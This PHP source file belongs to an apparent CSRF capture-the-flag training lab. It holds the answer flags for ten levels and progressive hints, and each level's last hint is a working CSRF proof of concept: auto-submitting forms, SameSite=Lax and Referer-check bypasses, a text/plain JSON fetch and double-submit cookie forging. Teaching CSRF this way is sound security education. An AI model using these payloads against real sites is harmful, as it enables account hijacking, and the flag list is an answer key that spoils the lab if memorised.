<?php
/**
 * CSRF Lab - Helper Functions
 * Lab chrome: flags, progressive hints, inline flag submission.
 * The vulnerable engine + white-box renderer live in csrf_engine.php / csrf_render.php.
 */

require_once __DIR__ . '/csrf_engine.php';
require_once __DIR__ . '/csrf_render.php';

/**
 * Returns the flag string for a given level ID.
 */
function get_flag_for_level(int $levelId): string {
    $flags = [
        1  => 'FLAG{csrf_get_state_change}',
        2  => 'FLAG{csrf_post_no_token}',
        3  => 'FLAG{csrf_token_not_checked}',
        4  => 'FLAG{csrf_predictable_token}',
        5  => 'FLAG{csrf_token_not_bound}',
        6  => 'FLAG{csrf_samesite_bypass}',
        7  => 'FLAG{csrf_json_content_type}',
        8  => 'FLAG{csrf_referer_bypass}',
        9  => 'FLAG{csrf_double_submit_flaw}',
        10 => 'FLAG{csrf_waf_bypass}',
    ];
    return $flags[$levelId] ?? '';
}

/**
 * Returns an array of 5 progressive hints for each level
 * (conceptual → … → full working PoC).
 */
function get_level_hints(int $levelId): array {
    $hints = [
        1 => [
            'CSRF works because the victim admin is <strong>already logged in</strong>. When their browser makes a request to <code>change_email.php</code>, the session cookie rides along automatically — the server cannot tell the request was not intended.',
            'Look at the handler: it changes <code>admin_email</code> straight from <code>$_GET[\'email\']</code> with <strong>no anti-CSRF token at all</strong>.',
            'Because it is a <em>GET</em> state-change, you do not even need a form. Any tag that makes the browser fetch a URL will do — an image is the classic choice.',
            'An <code>&lt;img&gt;</code> whose <code>src</code> points at the endpoint fires the request the moment the page loads, silently, as the admin.',
            'Working PoC: <code>&lt;img src="change_email.php?email=attacker@evil.com"&gt;</code>',
        ],
        2 => [
            'This time the endpoint only accepts <strong>POST</strong>. A bare <code>&lt;img&gt;</code> sends a GET, so you need something that issues a cross-site POST.',
            'An HTML <code>&lt;form&gt;</code> can target any origin and POST hidden fields. There is still <strong>no CSRF token</strong> on this endpoint.',
            'To make it fire without the victim clicking anything, add a tiny script that calls <code>form.submit()</code> as soon as the page loads.',
            'Give the form <code>action="change_email.php"</code>, <code>method="POST"</code> and a hidden <code>email</code> field.',
            'Working PoC:<br><code>&lt;form action="change_email.php" method="POST" id="f"&gt;<br>&nbsp;&nbsp;&lt;input type="hidden" name="email" value="attacker@evil.com"&gt;<br>&lt;/form&gt;<br>&lt;script&gt;document.getElementById(\'f\').submit();&lt;/script&gt;</code>',
        ],
        3 => [
            'The form here <em>has</em> a <code>csrf_token</code> field, so it looks protected. Read the server handler carefully before assuming it is.',
            'The handler reads <code>$_POST[\'csrf_token\']</code> into a variable — but the line that <strong>compares</strong> it to the session token was never written (it is commented out).',
            'A token that is generated but never validated is no protection at all. You can send <em>any</em> token value, or omit it entirely.',
            'Reuse the level 2 auto-submitting POST form against <code>change_email.php</code>. The missing check means it succeeds.',
            'Working PoC:<br><code>&lt;form action="change_email.php" method="POST" id="f"&gt;<br>&nbsp;&nbsp;&lt;input type="hidden" name="email" value="attacker@evil.com"&gt;<br>&nbsp;&nbsp;&lt;input type="hidden" name="csrf_token" value="anything"&gt;<br>&lt;/form&gt;<br>&lt;script&gt;document.getElementById(\'f\').submit();&lt;/script&gt;</code>',
        ],
        4 => [
            'Now the token <em>is</em> validated on <code>promote.php</code>. But a token only helps if the attacker cannot predict it.',
            'Read the source: the expected token is a <strong>hardcoded constant</strong> (<code>a1b2c3d4</code>), identical for every user and every session.',
            'Since the value is baked into the code, you already know it. Just include it in your forged request.',
            'Build an auto-submitting POST form to <code>promote.php</code> with <code>user=mallory</code> and <code>csrf_token=a1b2c3d4</code>.',
            'Working PoC:<br><code>&lt;form action="promote.php" method="POST" id="f"&gt;<br>&nbsp;&nbsp;&lt;input type="hidden" name="user" value="mallory"&gt;<br>&nbsp;&nbsp;&lt;input type="hidden" name="csrf_token" value="a1b2c3d4"&gt;<br>&lt;/form&gt;<br>&lt;script&gt;document.getElementById(\'f\').submit();&lt;/script&gt;</code>',
        ],
        5 => [
            'The token now looks random, and the handler even rejects malformed values. But <em>validating a format</em> is not the same as <em>validating authenticity</em>.',
            'The check is only <code>preg_match(\'/^[a-f0-9]{32}$/i\', $token)</code>. It never compares the token to the one stored in the admin\'s session.',
            'That means <strong>any</strong> 32-character hex string passes — including one you invent yourself.',
            'Send an auto-submitting POST form to <code>change_email.php</code> with a <code>csrf_token</code> made of 32 hex characters.',
            'Working PoC:<br><code>&lt;form action="change_email.php" method="POST" id="f"&gt;<br>&nbsp;&nbsp;&lt;input type="hidden" name="email" value="attacker@evil.com"&gt;<br>&nbsp;&nbsp;&lt;input type="hidden" name="csrf_token" value="0123456789abcdef0123456789abcdef"&gt;<br>&lt;/form&gt;<br>&lt;script&gt;document.getElementById(\'f\').submit();&lt;/script&gt;</code>',
        ],
        6 => [
            'The admin_session cookie here is <code>SameSite=Lax</code>, so a cross-site <em>POST</em> (or an <code>&lt;img&gt;</code> subresource) will <strong>not</strong> carry it. That is why a plain form CSRF fails on this level.',
            'SameSite=Lax has a well-known gap: it <strong>still sends the cookie on top-level GET navigations</strong> — when the whole browser tab navigates to a URL.',
            'The <code>quick_email.php</code> endpoint accepts a state-changing action over GET and relies only on SameSite for protection.',
            'Make the victim\'s tab navigate to the URL, e.g. with <code>window.location</code> or a <code>&lt;meta http-equiv="refresh"&gt;</code>. A subresource <code>&lt;img&gt;</code> will NOT work — it must be a top-level navigation.',
            'Working PoC: <code>&lt;script&gt;window.location = "quick_email.php?email=attacker@evil.com";&lt;/script&gt;</code>',
        ],
        7 => [
            'The <code>api_update.php</code> endpoint reads a <strong>JSON body</strong> and has no token. Developers often assume such an endpoint is safe because JSON requests trigger a CORS preflight.',
            'A preflight is only sent for <em>non-simple</em> requests. A request with <code>Content-Type: text/plain</code> is a <strong>simple request</strong> — it is sent cross-site with no preflight.',
            'So you can POST a <code>text/plain</code> body that just happens to be valid JSON. The server <code>json_decode()</code>s it and never notices the content type.',
            'Use <code>fetch()</code> with <code>Content-Type: text/plain</code> and a JSON string body containing the new email. (An <code>application/json</code> body would be blocked by preflight.)',
            'Working PoC:<br><code>&lt;script&gt;<br>fetch("api_update.php", {<br>&nbsp;&nbsp;method: "POST",<br>&nbsp;&nbsp;headers: { "Content-Type": "text/plain" },<br>&nbsp;&nbsp;body: \'{"email":"attacker@evil.com"}\',<br>&nbsp;&nbsp;credentials: "include"<br>});<br>&lt;/script&gt;</code>',
        ],
        8 => [
            'This endpoint tries to stop CSRF by checking the <code>Referer</code> header — if it is present and points at another site, the request is rejected.',
            'But the check <strong>fails open</strong>: when the Referer is <em>absent</em>, the request is allowed through. The developer forgot that browsers can be told not to send it.',
            'You can suppress the Referer entirely with a <code>&lt;meta name="referrer" content="no-referrer"&gt;</code> tag (or <code>rel="noreferrer"</code> / <code>referrerpolicy</code>).',
            'Combine the no-referrer policy with the level 2 auto-submitting POST form to <code>change_email.php</code>.',
            'Working PoC:<br><code>&lt;meta name="referrer" content="no-referrer"&gt;<br>&lt;form action="change_email.php" method="POST" id="f"&gt;<br>&nbsp;&nbsp;&lt;input type="hidden" name="email" value="attacker@evil.com"&gt;<br>&lt;/form&gt;<br>&lt;script&gt;document.getElementById(\'f\').submit();&lt;/script&gt;</code>',
        ],
        9 => [
            'This is the <strong>double-submit cookie</strong> pattern: the server accepts the request when the <code>csrf_token</code> <em>cookie</em> equals the <code>csrf_token</code> in the request body.',
            'The flaw: the server never checks that the token is one <em>it</em> issued. It only checks cookie == body. If the attacker can set the cookie, they control both sides.',
            'From script you can write a non-HttpOnly cookie with <code>document.cookie</code>. Set it to a value you choose, then submit the form with the <strong>same</strong> value in the body.',
            'Target <code>promote.php</code> with <code>user=mallory</code>, put your chosen value in both the cookie and the hidden <code>csrf_token</code> field.',
            'Working PoC:<br><code>&lt;form action="promote.php" method="POST" id="f"&gt;<br>&nbsp;&nbsp;&lt;input type="hidden" name="user" value="mallory"&gt;<br>&nbsp;&nbsp;&lt;input type="hidden" name="csrf_token" value="pwned123"&gt;<br>&lt;/form&gt;<br>&lt;script&gt;<br>&nbsp;&nbsp;document.cookie = "csrf_token=pwned123; path=/";<br>&nbsp;&nbsp;document.getElementById(\'f\').submit();<br>&lt;/script&gt;</code>',
        ],
        10 => [
            'The final endpoint <code>transfer_owner.php</code> stacks three defenses: a CSRF token, a <code>SameSite=Lax</code> cookie, and a <code>Referer</code> check. You must defeat all three at once.',
            'Each defense has the same weakness you already exploited: the token is <strong>format-only</strong> (level 5), SameSite=Lax leaks on <strong>top-level GET</strong> (level 6), and the Referer check <strong>fails open</strong> when suppressed (level 8).',
            'Crucially, the sensitive action is reachable over <em>GET</em>. That single design choice lets a top-level navigation carry the Lax cookie.',
            'So: a top-level GET navigation (SameSite gap), with a no-referrer policy (Referer gap), and any 32-hex <code>csrf_token</code> (binding gap), all pointing at <code>transfer_owner.php?new_owner=mallory</code>.',
            'Working PoC:<br><code>&lt;meta name="referrer" content="no-referrer"&gt;<br>&lt;meta http-equiv="refresh" content="0;url=transfer_owner.php?new_owner=mallory&amp;csrf_token=0123456789abcdef0123456789abcdef"&gt;</code>',
        ],
    ];
    return $hints[$levelId] ?? [];
}

/**
 * Renders a progressive hint section with a "Show Next Hint" button.
 * (Copied verbatim from the suite template — shared JS listener via static flag.)
 */
function render_hint_section(array $hints, string $title = 'Hints'): string {
    if (empty($hints)) return '';
    static $scriptRendered = false;
    $id = uniqid('hint_', false);
    ob_start();
    ?>
    <div class="hints" id="<?= $id ?>">
        <h3><?= htmlspecialchars($title) ?></h3>
        <button class="hint-btn" data-hint-target="<?= $id ?>">Show Next Hint (0/<?= count($hints) ?>)</button>
        <ul class="hint-list">
            <?php foreach ($hints as $hint): ?>
            <li class="hint-item" hidden><?= $hint ?></li>
            <?php endforeach; ?>
        </ul>
    </div>
    <?php
    if (!$scriptRendered) {
        $scriptRendered = true;
        ?>
        <script>
        document.addEventListener('click', function(e) {
            if (!e.target.classList.contains('hint-btn')) return;
            const targetId = e.target.getAttribute('data-hint-target');
            const container = document.getElementById(targetId);
            const items = container.querySelectorAll('.hint-item[hidden]');
            const total = container.querySelectorAll('.hint-item').length;
            if (items.length > 0) {
                items[0].removeAttribute('hidden');
                const shown = total - items.length + 1;
                e.target.textContent = shown < total ? 'Show Next Hint (' + shown + '/' + total + ')' : 'All hints shown';
                if (shown >= total) e.target.disabled = true;
            }
        });
        </script>
        <?php
    }
    return ob_get_clean();
}

/**
 * Handle inline flag submission on a level page.
 * Only acts when POST contains _flag_submit=1.
 *
 * @return array{status: string|null, message: string, already_completed: bool}
 */
function handle_inline_flag_submit(int $levelId): array
{
    $result = ['status' => null, 'message' => '', 'already_completed' => false];

    $completed = [];
    if (!empty($_COOKIE['csrf_lab_progress'])) {
        $decoded = json_decode($_COOKIE['csrf_lab_progress'], true);
        if (is_array($decoded)) $completed = $decoded;
    }
    $result['already_completed'] = in_array($levelId, $completed);

    if ($_SERVER['REQUEST_METHOD'] !== 'POST' || empty($_POST['_flag_submit'])) {
        return $result;
    }

    $flag = trim($_POST['submitted_flag'] ?? '');
    if ($flag === '') {
        $result['status']  = 'error';
        $result['message'] = 'Please enter a flag.';
        return $result;
    }

    if ($flag === get_flag_for_level($levelId)) {
        if (!in_array($levelId, $completed)) {
            $completed[] = $levelId;
            sort($completed);
            setcookie('csrf_lab_progress', json_encode($completed), time() + 86400 * 30, '/');
        }
        $result['status']           = 'success';
        $result['message']          = 'Correct! Flag accepted.';
        $result['already_completed'] = true;
    } else {
        $result['status']  = 'error';
        $result['message'] = 'Incorrect flag. Keep trying!';
    }

    return $result;
}

/**
 * Render the compact inline flag submit form.
 *
 * @param array{status: string|null, message: string, already_completed: bool} $result
 */
function render_inline_flag_form(int $levelId, array $result): string
{
    $status           = $result['status'] ?? null;
    $message          = $result['message'] ?? '';
    $alreadyCompleted = $result['already_completed'] ?? false;

    ob_start();
    ?>
    <div class="inline-flag-submit">
        <h3>Submit Flag</h3>
        <div class="form-inner">
            <?php if ($status === 'success'): ?>
                <div class="message success"><?= htmlspecialchars($message) ?> &mdash; <a href="submit.php">view all progress &rarr;</a></div>
            <?php elseif ($status === 'error'): ?>
                <div class="message error"><?= htmlspecialchars($message) ?></div>
            <?php endif; ?>
            <?php if ($alreadyCompleted && $status !== 'success'): ?>
                <div class="message info">Level <?= (int)$levelId ?> already completed. <a href="submit.php">View progress &rarr;</a></div>
            <?php endif; ?>
            <?php if (!$alreadyCompleted || $status === 'error'): ?>
            <form method="POST" action="">
                <input type="hidden" name="_flag_submit" value="1">
                <div class="inline-flag-row">
                    <input type="text" name="submitted_flag" class="form-control"
                           placeholder="FLAG{...}" autocomplete="off" spellcheck="false"
                           value="<?= htmlspecialchars($_POST['submitted_flag'] ?? '') ?>">
                    <button type="submit" class="btn btn-primary">Check</button>
                </div>
            </form>
            <?php endif; ?>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Shared per-level boot: handles victim reset + inline flag POST, loads state,
 * pulls the one-shot delivery result, and assembles hint/flag-form markup.
 *
 * @return array{state: array, result: array|null, solved: bool, flag: string, hints: array, flag_form: string}
 */
function csrf_level_prepare(int $level): array
{
    if (isset($_GET['reset'])) {
        csrf_reset_level($level);
        header('Location: level' . $level . '.php');
        exit;
    }

    $flagResult = handle_inline_flag_submit($level);
    $state      = csrf_get_state($level);

    $result = $_SESSION['csrf_result'][$level] ?? null;
    if (isset($_SESSION['csrf_result'][$level])) {
        unset($_SESSION['csrf_result'][$level]); // one-shot: Post/Redirect/Get
    }

    $solved = !empty($state['solved']);

    return [
        'state'     => $state,
        'result'    => $result,
        'solved'    => $solved,
        'flag'      => $solved ? get_flag_for_level($level) : '',
        'hints'     => get_level_hints($level),
        'flag_form' => render_inline_flag_form($level, $flagResult),
    ];
}
